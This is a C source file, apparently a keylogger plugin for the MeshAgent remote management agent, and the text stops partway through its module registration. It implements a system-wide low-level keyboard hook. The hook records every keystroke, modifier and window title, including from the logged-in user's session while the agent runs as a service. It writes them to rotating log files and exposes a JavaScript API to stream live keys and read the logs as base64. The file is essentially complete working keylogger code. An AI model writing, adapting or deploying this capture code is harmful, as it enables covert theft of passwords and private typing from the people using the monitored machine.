/* Native Windows keylogger for MeshAgent (mckeylog plugin).
 *
 * A WH_KEYBOARD_LL hook on a dedicated thread captures every key press
 * (including from the interactive user session when the agent runs as
 * a service). Each key produces one text line:
 *
 *     YYYY-MM-DD HH:MM:SS.mmm  <char or [Name]>  <mods>  <foreground window>
 *
 * Lines are appended to a rolling, date-named log file
 * (keylog-YYYY-MM-DD.log, rotated to -1/-2 at the size limit) in the
 * agent directory, and the most recent lines are kept in an in-memory
 * ring buffer that JavaScript polls for live streams.
 *
 * JavaScript API (require('keylogger')):
 *     start(opts?)   opts: { logDir?: string, maxFileSizeKB?: int, windowTitles?: bool }
 *     stop()
 *     getState()     { available, running, totalKeys, bufferLines, bufferSize, dir, currentFile, lastError }
 *     read(maxLines) array of pending line strings (0 = all pending), oldest first
 *     listFiles()    array of { name, size, mtime } for keylog-*.log, newest first
 *     readFile(name, offset, maxBytes) { data (base64), size, bytes, done }
 */
#include "ILibDuktape_Keylogger.h"
#include "ILibDuktape_Helpers.h"
#include "ILibDuktapeModSearch.h"

#ifdef WIN32

#include <windows.h>
#ifndef LLKHF_REPEAT
#define LLKHF_REPEAT 0x0001
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define KEYLOG_RING_LINES 4096
#define KEYLOG_LINE_MAX 384
#define KEYLOG_WINDOW_MAX 160
#define KEYLOG_NAME_MAX 260
#define KEYLOG_PATH_MAX 1024
#define KEYLOG_DEFAULT_MAX_FILE (10 * 1024 * 1024)
#define KEYLOG_MIN_MAX_FILE (1024 * 1024)
#define KEYLOG_MAX_MAX_FILE (256 * 1024 * 1024)
#define KEYLOG_MAX_LIST 128
#define KEYLOG_STOP_WAIT_MS 10000

typedef struct KeylogLine
{
    unsigned int seq;
    char text[KEYLOG_LINE_MAX];
} KeylogLine;

typedef struct KeylogFile
{
    char name[KEYLOG_NAME_MAX];
    unsigned long long size;
    unsigned long long mtime;
} KeylogFile;

typedef struct Keylog
{
    CRITICAL_SECTION cs;
    volatile LONG ready;
    volatile LONG running;
    HANDLE stopEvent;
    HANDLE thread;

    KeylogLine ring[KEYLOG_RING_LINES];
    unsigned int ringHead;
    unsigned int ringCount;
    unsigned int seq;

    char dir[KEYLOG_NAME_MAX];
    char currentFile[KEYLOG_NAME_MAX];
    char currentDate[16];
    FILE *current;
    unsigned long long currentSize;
    unsigned long long maxFileSize;
    int windowTitles;

    unsigned long long totalKeys;
    char lastError[KEYLOG_LINE_MAX];
} Keylog;

static Keylog g_kl;

/* ------------------------------------------------------------------ */
/* Small helpers                                                       */
/* ------------------------------------------------------------------ */

static void Keylog_EnsureInit(void)
{
    if (InterlockedCompareExchange(&g_kl.ready, 1, 0) == 0)
    {
        InitializeCriticalSection(&g_kl.cs);
        g_kl.stopEvent = CreateEventW(NULL, TRUE, TRUE, NULL);
        g_kl.maxFileSize = KEYLOG_DEFAULT_MAX_FILE;
        g_kl.currentDate[0] = 0;
        g_kl.dir[0] = '.';
        g_kl.dir[1] = 0;
    }
}

static void Keylog_SetError(const char *msg)
{
    if (msg != NULL) { snprintf(g_kl.lastError, sizeof(g_kl.lastError), "%s", msg); }
    else { g_kl.lastError[0] = 0; }
}

static void Keylog_WideToUtf8(const wchar_t *src, char *dst, int dstLen)
{
    int n = WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstLen - 1, NULL, NULL);
    if (n > 0) { dst[n - 1] = 0; }
    else { dst[0] = 0; }
}

static void Keylog_Utf8ToWide(const char *src, wchar_t *dst, int dstLen)
{
    MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, src, -1, dst, dstLen);
}

/* Directory of the agent executable (where the log files live by default). */
static void Keylog_DefaultDir(char *out, int outLen)
{
    wchar_t w[1024];
    wchar_t *slash;
    char tmp[KEYLOG_NAME_MAX];
    int n = GetModuleFileNameW(NULL, w, (int)(sizeof(w) / sizeof(w[0])));
    if (n <= 0) { snprintf(out, outLen, "."); return; }
    slash = wcsrchr(w, L'\\');
    if (slash != NULL) { *slash = 0; }
    Keylog_WideToUtf8(w, tmp, sizeof(tmp));
    snprintf(out, outLen, "%s", tmp);
}

static void Keylog_FilePath(char *out, int outLen, const char *fileName)
{
    snprintf(out, outLen, "%s\\%s", g_kl.dir, fileName);
}

static int Keylog_ValidFileName(const char *name)
{
    int i;
    if (strncmp(name, "keylog-", 7) != 0) { return 0; }
    i = 7;
    if ((name[i + 0] < '0' || name[i + 0] > '9') || (name[i + 1] < '0' || name[i + 1] > '9') ||
        (name[i + 2] < '0' || name[i + 2] > '9') || (name[i + 3] < '0' || name[i + 3] > '9')) { return 0; }
    i += 4;
    if (name[i] != '-') { return 0; }
    i += 1;
    if ((name[i] < '0' || name[i] > '9') || (name[i + 1] < '0' || name[i + 1] > '9')) { return 0; }
    i += 2;
    if (name[i] != '-') { return 0; }
    i += 1;
    if ((name[i] < '0' || name[i] > '9') || (name[i + 1] < '0' || name[i + 1] > '9')) { return 0; }
    i += 2;
    if (strcmp(name + i, ".log") == 0) { return 1; }
    if (strcmp(name + i, "-1.log") == 0) { return 1; }
    if (strcmp(name + i, "-2.log") == 0) { return 1; }
    return 0;
}

static unsigned long long Keylog_FileTimeToUtcMs(const FILETIME *ft)
{
    ULARGE_INTEGER v;
    v.HighPart = ft->dwHighDateTime;
    v.LowPart = ft->dwLowDateTime;
    if (v.QuadPart < 116444736000000000ULL) { return 0; }
    return (v.QuadPart - 116444736000000000ULL) / 10000ULL;
}

/* ------------------------------------------------------------------ */
/* Line formatting                                                     */
/* ------------------------------------------------------------------ */

static const struct
{
    WORD vk;
    const char *name;
} g_vkNames[] =
{
    { 0x08, "[Backspace]" }, { 0x09, "[Tab]" }, { 0x0A, "[VerticalTab]" }, { 0x0C, "[Clear]" },
    { 0x0D, "[Enter]" }, { 0x10, "[Shift]" }, { 0x11, "[Ctrl]" }, { 0x12, "[Alt]" },
    { 0x13, "[Pause]" }, { 0x14, "[CapsLock]" }, { 0x15, "[Kana]" }, { 0x16, "[Junja]" },
    { 0x17, "[Final]" }, { 0x18, "[Hanja]" }, { 0x19, "[Kanji]" }, { 0x1B, "[Esc]" },
    { 0x21, "[PgUp]" }, { 0x22, "[PgDn]" }, { 0x23, "[End]" }, { 0x24, "[Home]" },
    { 0x25, "[Left]" }, { 0x26, "[Up]" }, { 0x27, "[Right]" }, { 0x28, "[Down]" },
    { 0x29, "[Select]" }, { 0x2A, "[Print]" }, { 0x2B, "[Execute]" }, { 0x2C, "[PrintScreen]" },
    { 0x2D, "[Insert]" }, { 0x2E, "[Delete]" }, { 0x2F, "[Help]" },
    { 0x5B, "[LWin]" }, { 0x5C, "[RWin]" }, { 0x5D, "[App]" }, { 0x5F, "[Sleep]" },
    { 0x6A, "[Numpad*]" }, { 0x6B, "[Numpad+]" }, { 0x6C, "[Numpad,]" }, { 0x6D, "[Numpad-]" },
    { 0x6E, "[Numpad.]" }, { 0x6F, "[Numpad/]" },
    { 0x90, "[NumLock]" }, { 0x91, "[ScrollLock]" },
    { 0xA0, "[LShift]" }, { 0xA1, "[RShift]" }, { 0xA2, "[LCtrl]" }, { 0xA3, "[RCtrl]" },
    { 0xA4, "[LAlt]" }, { 0xA5, "[RAlt]" }
};

static void Keylog_KeyName(WORD vk, char *out, int outLen)
{
    unsigned int i;
    for (i = 0; i < (unsigned int)(sizeof(g_vkNames) / sizeof(g_vkNames[0])); i++)
    {
        if (g_vkNames[i].vk == vk)
        {
            snprintf(out, outLen, "%s", g_vkNames[i].name);
            return;
        }
    }
    if ((vk >= 0x70) && (vk <= 0x87))
    {
        snprintf(out, outLen, "[F%u]", (unsigned int)(vk - 0x70 + 1));
        return;
    }
    snprintf(out, outLen, "[VK_0x%02X]", (unsigned int)vk);
}

static void Keylog_Modifiers(char *out, int outLen)
{
    char *p = out;
    out[0] = 0;
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) { p += (int)snprintf(p, outLen - (int)(p - out), "%sCTRL", (p > out) ? "+" : ""); }
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { p += (int)snprintf(p, outLen - (int)(p - out), "%sSHIFT", (p > out) ? "+" : ""); }
    if (GetAsyncKeyState(VK_MENU) & 0x8000) { p += (int)snprintf(p, outLen - (int)(p - out), "%sALT", (p > out) ? "+" : ""); }
    if ((GetAsyncKeyState(VK_LWIN) & 0x8000) || (GetAsyncKeyState(VK_RWIN) & 0x8000)) { p += (int)snprintf(p, outLen - (int)(p - out), "%sWIN", (p > out) ? "+" : ""); }
    if (p == out) { snprintf(out, outLen, "-"); }
}

static int Keylog_TryChar(WORD vk, WORD scan, DWORD hookFlags, wchar_t *wc)
{
    BYTE state[256];
    HKL hkl;
    int n;
    memset(state, 0, sizeof(state));
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { state[VK_SHIFT] = 0x80; }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) { state[VK_CONTROL] = 0x80; }
    if (GetAsyncKeyState(VK_MENU) & 0x8000) { state[VK_MENU] = 0x80; }
    if (GetAsyncKeyState(VK_LWIN) & 0x8000) { state[VK_LWIN] = 0x80; }
    if (GetAsyncKeyState(VK_RWIN) & 0x8000) { state[VK_RWIN] = 0x80; }
    state[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 1);
    state[VK_NUMLOCK] = (BYTE)(GetKeyState(VK_NUMLOCK) & 1);
    state[VK_SCROLL] = (BYTE)(GetKeyState(VK_SCROLL) & 1);
    if ((hookFlags & 0x01) != 0) { state[0xFF] = 0x80; }
    hkl = GetKeyboardLayout(0);
    n = ToUnicodeEx(vk, scan, state, wc, 2, 0, hkl);
    return n;
}

struct Keylog_TopWin
{
    HWND top;
};

static BOOL CALLBACK Keylog_TopWinProc(HWND h, LPARAM lp)
{
    struct Keylog_TopWin *ctx = (struct Keylog_TopWin*)(uintptr_t)lp;
    DWORD pid = 0;
    DWORD sess = 0;
    DWORD tid = GetWindowThreadProcessId(h, &pid);
    if (tid == 0) { return TRUE; }
    /* Skip windows owned by service-session (session 0) processes. */
    if (ProcessIdToSessionId(pid, &sess) == 0 && sess == 0) { return TRUE; }
    if (!IsWindowVisible(h)) { return TRUE; }
    if (IsIconic(h)) { return TRUE; }
    if (GetWindow(h, GW_OWNER) != NULL) { return TRUE; }
    if ((GetWindowLongPtrW(h, GWL_EXSTYLE) & (WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE)) != 0) { return TRUE; }
    if (GetWindowTextW(h, NULL, 0) <= 0) { return TRUE; }
    ctx->top = h;
    return FALSE; /* Keep the top-most candidate only. */
}

/* Best effort foreground window title. When the agent runs as a service
 * (session 0) GetForegroundWindow returns NULL, so fall back to the
 * top-most visible, titled window of an interactive session. */
static void Keylog_WindowTitle(char *out, int outLen)
{
    HWND h = NULL;
    wchar_t w[KEYLOG_WINDOW_MAX / 2 + 1];
    int n;
    int c;
    out[0] = 0;
    if (!g_kl.windowTitles) { return; }
    h = GetForegroundWindow();
    if (h == NULL)
    {
        struct Keylog_TopWin ctx;
        ctx.top = NULL;
        EnumWindows(Keylog_TopWinProc, (LPARAM)(uintptr_t)&ctx);
        h = ctx.top;
    }
    if (h == NULL) { return; }
    n = GetWindowTextW(h, w, (int)(sizeof(w) / sizeof(w[0])) - 1);
    if (n <= 0) { return; }
    c = WideCharToMultiByte(CP_UTF8, 0, w, n, out, outLen - 1, NULL, NULL);
    if (c > 0) { out[c] = 0; }
    else { out[0] = 0; }
}

/* ------------------------------------------------------------------ */
/* Log file                                                            */
/* ------------------------------------------------------------------ */

static void Keylog_CloseCurrent(void)
{
    if (g_kl.current != NULL)
    {
        fflush(g_kl.current);
        fclose(g_kl.current);
        g_kl.current = NULL;
    }
    g_kl.currentFile[0] = 0;
}

static void Keylog_OpenCurrent(void)
{
    char name[KEYLOG_NAME_MAX];
    char path[KEYLOG_PATH_MAX];
    long end;
    snprintf(name, sizeof(name), "keylog-%s.log", g_kl.currentDate);
    Keylog_FilePath(path, sizeof(path), name);
    g_kl.current = fopen(path, "ab");
    if (g_kl.current == NULL)
    {
        Keylog_SetError("Could not open the keylog file for writing");
        return;
    }
    end = ftell(g_kl.current);
    if (end < 0) { end = 0; }
    g_kl.currentSize = (unsigned long long)end;
    snprintf(g_kl.currentFile, sizeof(g_kl.currentFile), "%s", name);
    Keylog_SetError(NULL);
}

static void Keylog_RotateSize(void)
{
    char nameBase[KEYLOG_NAME_MAX];
    char name1[KEYLOG_NAME_MAX + 8];
    char name2[KEYLOG_NAME_MAX + 8];
    char pathA[KEYLOG_PATH_MAX];
    char pathB[KEYLOG_PATH_MAX];
    Keylog_CloseCurrent();
    snprintf(nameBase, sizeof(nameBase), "keylog-%s.log", g_kl.currentDate);
    snprintf(name1, sizeof(name1), "keylog-%s-1.log", g_kl.currentDate);
    snprintf(name2, sizeof(name2), "keylog-%s-2.log", g_kl.currentDate);
    Keylog_FilePath(pathA, sizeof(pathA), name2);
    remove(pathA);
    Keylog_FilePath(pathA, sizeof(pathA), name1);
    Keylog_FilePath(pathB, sizeof(pathB), name2);
    rename(pathA, pathB);
    Keylog_FilePath(pathA, sizeof(pathA), nameBase);
    Keylog_FilePath(pathB, sizeof(pathB), name1);
    rename(pathA, pathB);
    Keylog_OpenCurrent();
}

/* ------------------------------------------------------------------ */
/* Capture (hook thread)                                               */
/* ------------------------------------------------------------------ */

static void Keylog_CaptureKey(WORD vk, WORD scan, DWORD flags)
{
    char line[KEYLOG_LINE_MAX];
    char ts[32];
    char key[64];
    char mods[32];
    char window[KEYLOG_WINDOW_MAX + 8];
    char date[16];
    wchar_t wc[2];
    SYSTEMTIME st;
    int n;
    int cl;

    GetLocalTime(&st);
    snprintf(ts, sizeof(ts), "%04u-%02u-%02u %02u:%02u:%02u.%03u",
        (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay,
        (unsigned int)st.wHour, (unsigned int)st.wMinute, (unsigned int)st.wSecond,
        (unsigned int)st.wMilliseconds);
    snprintf(date, sizeof(date), "%04u-%02u-%02u", (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay);

    n = Keylog_TryChar(vk, scan, flags, wc);
    if ((n == 1) && ((wc[0] & 0xFC00) == 0) && (wc[0] >= 0x20))
    {
        cl = WideCharToMultiByte(CP_UTF8, 0, wc, 1, key, (int)sizeof(key) - 1, NULL, NULL);
        if (cl > 0) { key[cl] = 0; }
        else { snprintf(key, sizeof(key), "[U+%04X]", (unsigned int)wc[0]); }
    }
    else
    {
        Keylog_KeyName(vk, key, (int)sizeof(key));
    }
    Keylog_Modifiers(mods, sizeof(mods));
    Keylog_WindowTitle(window, sizeof(window));
    snprintf(line, sizeof(line), "%s  %s  %s  %s", ts, key, mods, window);

    EnterCriticalSection(&g_kl.cs);
    {
        unsigned int idx = (g_kl.ringHead + g_kl.ringCount) % KEYLOG_RING_LINES;
        if (g_kl.ringCount == KEYLOG_RING_LINES)
        {
            g_kl.ringHead = (g_kl.ringHead + 1) % KEYLOG_RING_LINES;
            idx = (g_kl.ringHead + g_kl.ringCount) % KEYLOG_RING_LINES;
        }
        g_kl.ring[idx].seq = g_kl.seq++;
        strncpy(g_kl.ring[idx].text, line, KEYLOG_LINE_MAX - 1);
        g_kl.ring[idx].text[KEYLOG_LINE_MAX - 1] = 0;
        if (g_kl.ringCount < KEYLOG_RING_LINES) { g_kl.ringCount++; }
        g_kl.totalKeys++;

        if (strcmp(date, g_kl.currentDate) != 0)
        {
            Keylog_CloseCurrent();
            snprintf(g_kl.currentDate, sizeof(g_kl.currentDate), "%s", date);
            Keylog_OpenCurrent();
        }
        if (g_kl.current != NULL)
        {
            fwrite(line, 1, strlen(line) + 1, g_kl.current);
            fflush(g_kl.current);
            g_kl.currentSize += strlen(line) + 1;
            if (g_kl.currentSize >= g_kl.maxFileSize) { Keylog_RotateSize(); }
        }
    }
    LeaveCriticalSection(&g_kl.cs);
}

static LRESULT CALLBACK Keylog_HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        if ((kb->flags & LLKHF_REPEAT) == 0)
        {
            Keylog_CaptureKey((WORD)kb->vkCode, (WORD)kb->scanCode, kb->flags);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

static DWORD WINAPI Keylog_ThreadProc(LPVOID param)
{
    Keylog *kl = (Keylog*)param;
    MSG msg;
    HHOOK hook;
    hook = SetWindowsHookExW(WH_KEYBOARD_LL, Keylog_HookProc, GetModuleHandleW(NULL), 0);
    while (WaitForSingleObject(kl->stopEvent, 50) != WAIT_OBJECT_0)
    {
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE) != FALSE)
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
    if (hook != NULL) { UnhookWindowsHookEx(hook); }
    return 0;
}

/* ------------------------------------------------------------------ */
/* JavaScript API                                                      */
/* ------------------------------------------------------------------ */

static void Keylog_StopInternal(void)
{
    Keylog_EnsureInit();
    EnterCriticalSection(&g_kl.cs);
    if (g_kl.running == 0)
    {
        LeaveCriticalSection(&g_kl.cs);
        return;
    }
    SetEvent(g_kl.stopEvent);
    LeaveCriticalSection(&g_kl.cs);
    if (g_kl.thread != NULL)
    {
        WaitForSingleObject(g_kl.thread, KEYLOG_STOP_WAIT_MS);
        CloseHandle(g_kl.thread);
        g_kl.thread = NULL;
    }
    EnterCriticalSection(&g_kl.cs);
    Keylog_CloseCurrent();
    g_kl.running = 0;
    LeaveCriticalSection(&g_kl.cs);
}

static duk_ret_t Keylog_Stop(duk_context *ctx)
{
    Keylog_StopInternal();
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t Keylog_Start(duk_context *ctx)
{
    char logDirBuf[KEYLOG_NAME_MAX + 1];
    int maxFileKB = 0;
    int windowTitles = 1;
    wchar_t wdir[KEYLOG_NAME_MAX];
    SYSTEMTIME st;
    DWORD threadId = 0;

    Keylog_EnsureInit();
    Keylog_StopInternal();
    logDirBuf[0] = 0;

    if (duk_is_object(ctx, 0))
    {
        if (duk_get_prop_string(ctx, 0, "logDir") == 1)
        {
            if (duk_is_string(ctx, -1))
            {
                duk_size_t l = 0;
                const char *s = duk_get_lstring(ctx, -1, &l);
                if (l >= sizeof(logDirBuf)) { l = (duk_size_t)(sizeof(logDirBuf) - 1); }
                memcpy(logDirBuf, s, (size_t)l);
                logDirBuf[l] = 0;
            }
            duk_pop(ctx);
        }
        if (duk_get_prop_string(ctx, 0, "maxFileSizeKB") == 1)
        {
            if (duk_is_number(ctx, -1)) { maxFileKB = (int)duk_get_int(ctx, -1); }
            duk_pop(ctx);
        }
        if (duk_get_prop_string(ctx, 0, "windowTitles") == 1)
        {
            if (duk_is_boolean(ctx, -1)) { windowTitles = duk_get_boolean(ctx, -1) ? 1 : 0; }
            duk_pop(ctx);
        }
    }

    if (logDirBuf[0] == 0)
    {
        Keylog_DefaultDir(g_kl.dir, sizeof(g_kl.dir));
    }
    else
    {
        Keylog_Utf8ToWide(logDirBuf, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));
        if (GetFileAttributesW(wdir) == INVALID_FILE_ATTRIBUTES)
        {
            if (CreateDirectoryW(wdir, NULL) == FALSE && GetLastError() != ERROR_ALREADY_EXISTS)
            {
                return ILibDuktape_Error(ctx, "keylogger.start: could not create the log directory");
            }
        }
        snprintf(g_kl.dir, sizeof(g_kl.dir), "%s", logDirBuf);
    }

    if (maxFileKB > 0)
    {
        if (maxFileKB < 1024) { maxFileKB = 1024; }
        if (maxFileKB > (int)(KEYLOG_MAX_MAX_FILE / 1024)) { maxFileKB = (int)(KEYLOG_MAX_MAX_FILE / 1024); }
        g_kl.maxFileSize = (unsigned long long)maxFileKB * 1024ULL;
    }
    g_kl.windowTitles = windowTitles;

    EnterCriticalSection(&g_kl.cs);
    GetLocalTime(&st);
    snprintf(g_kl.currentDate, sizeof(g_kl.currentDate), "%04u-%02u-%02u",
        (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay);
    Keylog_CloseCurrent();
    Keylog_OpenCurrent();
    if (g_kl.current == NULL) { Keylog_SetError("Could not open the keylog file for writing"); }
    LeaveCriticalSection(&g_kl.cs);

    if (g_kl.stopEvent == NULL)
    {
        return ILibDuktape_Error(ctx, "keylogger.start: could not create the stop event");
    }
    ResetEvent(g_kl.stopEvent);
    g_kl.thread = CreateThread(NULL, 0, Keylog_ThreadProc, &g_kl, 0, &threadId);
    if (g_kl.thread == NULL)
    {
        Keylog_SetError("Could not start the keylogger hook thread");
        duk_push_false(ctx);
        return 1;
    }
    g_kl.running = 1;
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t Keylog_GetState(duk_context *ctx)
{
    Keylog_EnsureInit();
    EnterCriticalSection(&g_kl.cs);
    duk_push_object(ctx);
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "available");
    duk_push_boolean(ctx, g_kl.running != 0 ? 1 : 0);
    duk_put_prop_string(ctx, -2, "running");
    duk_push_number(ctx, (double)g_kl.totalKeys);
    duk_put_prop_string(ctx, -2, "totalKeys");
    duk_push_number(ctx, (double)g_kl.ringCount);
    duk_put_prop_string(ctx, -2, "bufferLines");
    duk_push_number(ctx, (double)KEYLOG_RING_LINES);
    duk_put_prop_string(ctx, -2, "bufferSize");
    duk_push_string(ctx, g_kl.dir);
    duk_put_prop_string(ctx, -2, "dir");
    duk_push_string(ctx, g_kl.currentFile);
    duk_put_prop_string(ctx, -2, "currentFile");
    duk_push_number(ctx, (double)g_kl.maxFileSize);
    duk_put_prop_string(ctx, -2, "maxFileSize");
    duk_push_string(ctx, g_kl.lastError);
    duk_put_prop_string(ctx, -2, "lastError");
    LeaveCriticalSection(&g_kl.cs);
    return 1;
}

static duk_ret_t Keylog_Read(duk_context *ctx)
{
    int max = duk_get_int_default(ctx, 0, 0);
    int count;
    int i;
    Keylog_EnsureInit();
    if (max < 0) { max = 0; }
    duk_push_array(ctx);
    EnterCriticalSection(&g_kl.cs);
    count = (int)g_kl.ringCount;
    if ((max > 0) && (max < count)) { count = max; }
    for (i = 0; i < count; i++)
    {
        const KeylogLine *ln = &g_kl.ring[g_kl.ringHead];
        duk_push_string(ctx, ln->text);
        duk_put_prop_index(ctx, -2, (duk_uarridx_t)i);
    }
    if (count > 0)
    {
        g_kl.ringHead = (g_kl.ringHead + (unsigned int)count) % KEYLOG_RING_LINES;
        g_kl.ringCount -= (unsigned int)count;
    }
    LeaveCriticalSection(&g_kl.cs);
    return 1;
}

static int Keylog_CompareFiles(const void *a, const void *b)
{
    const KeylogFile *fa = (const KeylogFile*)a;
    const KeylogFile *fb = (const KeylogFile*)b;
    if (fa->mtime == fb->mtime) { return 0; }
    return (fa->mtime > fb->mtime) ? -1 : 1; /* Newest first. */
}

static duk_ret_t Keylog_ListFiles(duk_context *ctx)
{
    char path[KEYLOG_PATH_MAX];
    wchar_t wpath[KEYLOG_PATH_MAX];
    WIN32_FIND_DATAW fd;
    HANDLE h;
    KeylogFile files[KEYLOG_MAX_LIST];
    int n = 0;
    int i;
    Keylog_EnsureInit();
    EnterCriticalSection(&g_kl.cs);
    snprintf(path, sizeof(path), "%s\\keylog-*.log", g_kl.dir);
    LeaveCriticalSection(&g_kl.cs);
    Keylog_Utf8ToWide(path, wpath, (int)(sizeof(wpath) / sizeof(wpath[0])));
    h = FindFirstFileW(wpath, &fd);
    duk_push_array(ctx);
    if (h == INVALID_HANDLE_VALUE) { return 1; }
    do
    {
        char name[KEYLOG_NAME_MAX];
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) { continue; }
        Keylog_WideToUtf8(fd.cFileName, name, sizeof(name));
        if (Keylog_ValidFileName(name) == 0) { continue; }
        if (n >= KEYLOG_MAX_LIST) { break; }
        snprintf(files[n].name, sizeof(files[n].name), "%s", name);
        files[n].size = ((unsigned long long)fd.nFileSizeHigh << 32) | (unsigned long long)fd.nFileSizeLow;
        files[n].mtime = Keylog_FileTimeToUtcMs(&fd.ftLastWriteTime);
        n++;
    } while (FindNextFileW(h, &fd) != FALSE);
    FindClose(h);
    if (n > 1) { qsort(files, (size_t)n, sizeof(KeylogFile), Keylog_CompareFiles); }
    for (i = 0; i < n; i++)
    {
        duk_push_object(ctx);
        duk_push_string(ctx, files[i].name);
        duk_put_prop_string(ctx, -2, "name");
        duk_push_number(ctx, (double)files[i].size);
        duk_put_prop_string(ctx, -2, "size");
        duk_push_number(ctx, (double)files[i].mtime);
        duk_put_prop_string(ctx, -2, "mtime");
        duk_put_prop_index(ctx, -2, (duk_uarridx_t)i);
    }
    return 1;
}

static const char g_b64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void Keylog_Base64(const unsigned char *data, unsigned long long len, char *out)
{
    unsigned long long i = 0;
    unsigned long long o = 0;
    while (i + 3 <= len)
    {
        out[o++] = g_b64Table[data[i] >> 2];
        out[o++] = g_b64Table[((data[i] & 0x03) << 4) | (data[i + 1] >> 4)];
        out[o++] = g_b64Table[((data[i + 1] & 0x0F) << 2) | (data[i + 2] >> 6)];
        out[o++] = g_b64Table[data[i + 2] & 0x3F];
        i += 3;
    }
    if (i < len)
    {
        out[o++] = g_b64Table[data[i] >> 2];
        if (i + 1 < len)
        {
            out[o++] = g_b64Table[((data[i] & 0x03) << 4) | (data[i + 1] >> 4)];
            out[o++] = g_b64Table[(data[i + 1] & 0x0F) << 2];
        }
        else
        {
            out[o++] = g_b64Table[(data[i] & 0x03) << 4];
            out[o++] = '=';
        }
        out[o++] = '=';
    }
    out[o] = 0;
}

static duk_ret_t Keylog_ReadFile(duk_context *ctx)
{
    const char *name;
    duk_size_t nameLen;
    int maxBytes = duk_get_int_default(ctx, 2, 65536);
    unsigned long long offset = 0;
    char path[KEYLOG_PATH_MAX];
    FILE *f = NULL;
    unsigned char *buf = NULL;
    char *b64 = NULL;
    unsigned long long bufLen = 0;
    unsigned long long total = 0;
    unsigned long long done = 0;
    int result = 0;

    Keylog_EnsureInit();
    if (!duk_is_string(ctx, 0)) { return ILibDuktape_Error(ctx, "keylogger.readFile(name, offset, maxBytes) requires a file name"); }
    name = duk_get_lstring(ctx, 0, &nameLen);
    if (nameLen < 1 || nameLen >= KEYLOG_NAME_MAX) { return ILibDuktape_Error(ctx, "keylogger.readFile: invalid file name"); }
    {
        char tmp[KEYLOG_NAME_MAX];
        memcpy(tmp, name, nameLen);
        tmp[nameLen] = 0;
        if (Keylog_ValidFileName(tmp) == 0) { return ILibDuktape_Error(ctx, "keylogger.readFile: invalid keylog file name"); }
    }
    if (duk_is_number(ctx, 1))
    {
        double d = duk_get_number(ctx, 1);
        if (d < 0) { d = 0; }
        if (d > 0x7FFFFFFF) { d = 0x7FFFFFFF; }
        offset = (unsigned long long)d;
    }
    if (maxBytes < 4096) { maxBytes = 4096; }
    if (maxBytes > 1048576) { maxBytes = 1048576; }

    EnterCriticalSection(&g_kl.cs);
    snprintf(path, sizeof(path), "%s\\%.*s", g_kl.dir, (int)nameLen, name);
    LeaveCriticalSection(&g_kl.cs);

    f = fopen(path, "rb");
    if (f == NULL)
    {
        duk_push_object(ctx);
        duk_push_string(ctx, "");
        duk_put_prop_string(ctx, -2, "data");
        duk_push_number(ctx, 0.0);
        duk_put_prop_string(ctx, -2, "size");
        duk_push_number(ctx, (double)offset);
        duk_put_prop_string(ctx, -2, "bytes");
        duk_push_boolean(ctx, 1);
        duk_put_prop_string(ctx, -2, "done");
        duk_push_string(ctx, "not found");
        duk_put_prop_string(ctx, -2, "error");
        return 1;
    }
    fseek(f, 0, SEEK_END);
    total = (unsigned long long)ftell(f);
    fseek(f, (long)offset, SEEK_SET);
    bufLen = (offset >= total) ? 0 : ((unsigned long long)maxBytes < (total - offset) ? (unsigned long long)maxBytes : (total - offset));
    buf = (unsigned char*)malloc((size_t)bufLen + 1);
    if (buf == NULL)
    {
        fclose(f);
        return ILibDuktape_Error(ctx, "keylogger.readFile: out of memory");
    }
    if (bufLen > 0)
    {
        result = (int)fread(buf, 1, (size_t)bufLen, f);
        if (result < 0) { result = 0; }
        bufLen = (unsigned long long)result;
    }
    fclose(f);
    done = (offset + bufLen >= total) ? 1 : 0;

    b64 = (char*)malloc((size_t)((bufLen / 3 + 1) * 4 + 8));
    if (b64 == NULL)
    {
        free(buf);
        return ILibDuktape_Error(ctx, "keylogger.readFile: out of memory");
    }
    Keylog_Base64(buf, bufLen, b64);
    free(buf);

    duk_push_object(ctx);
    duk_push_string(ctx, b64);
    duk_put_prop_string(ctx, -2, "data");
    duk_push_number(ctx, (double)total);
    duk_put_prop_string(ctx, -2, "size");
    duk_push_number(ctx, (double)bufLen);
    duk_put_prop_string(ctx, -2, "bytes");
    duk_push_number(ctx, (double)offset);
    duk_put_prop_string(ctx, -2, "offset");
    duk_push_boolean(ctx, done != 0 ? 1 : 0);
    duk_put_prop_string(ctx, -2, "done");
    free(b64);
    return 1;
}

static void Keylog_Push(duk_context *ctx, void *chain)
{
    (void)chain;
    duk_push_object(ctx);
    duk_push_c_function(ctx, Keylog_Start, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "start");
    duk_push_c_function(ctx, Keylog_Stop, 0);
    duk_put_prop_string(ctx, -2, "stop");
    duk_push_c_function(ctx, Keylog_GetState, 0);
    duk_put_prop_string(ctx, -2, "getState");
    duk_push_c_function(ctx, Keylog_Read, 1);
    duk_put_prop_string(ctx, -2, "read");
    duk_push_c_function(ctx, Keylog_ListFiles, 0);
    duk_put_prop_string(ctx, -2, "listFiles");
